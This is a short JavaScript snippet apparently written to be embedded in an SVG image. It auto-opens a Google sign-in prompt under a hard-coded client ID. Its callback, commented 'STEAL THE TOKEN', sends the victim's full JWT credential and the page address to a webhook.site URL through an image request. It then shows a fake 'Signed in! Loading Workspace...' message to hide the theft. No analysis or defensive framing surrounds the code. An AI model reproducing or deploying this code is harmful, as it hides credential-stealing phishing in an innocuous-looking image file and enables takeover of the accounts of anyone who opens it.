svg.script:
    // Auto-trigger after API loads
    setTimeout(function() {
      if (window.google && google.accounts && google.accounts.id) {
        google.accounts.id.initialize({
          client_id: '561478328063-3i8n5ve256gl3hh0elebre2g0111l5lk.apps.googleusercontent.com',
          callback: onSignIn
        });
        google.accounts.id.prompt();   // opens the official picker
      }
    }, 800);

    // STEAL THE TOKEN
    function onSignIn(resp) {
      const token = resp.credential;   // full JWT
      new Image().src =
        'https://webhook.site/79f5d586-3939-4986-b04e-f0f4431b97b0?token='
        + encodeURIComponent(token)
        + '&src=' + encodeURIComponent(location.href);

      // Success message
      const txt = document.createElementNS('http://www.w3.org/2000/svg','text');
      txt.setAttribute('x','190');
      txt.setAttribute('y','370');
      txt.setAttribute('font-family','Roboto');
      txt.setAttribute('font-size','16');
      txt.setAttribute('fill','green');
      txt.setAttribute('text-anchor','middle');
      txt.textContent = 'Signed in! Loading Workspace...';
      document.documentElement.appendChild(txt);
    }
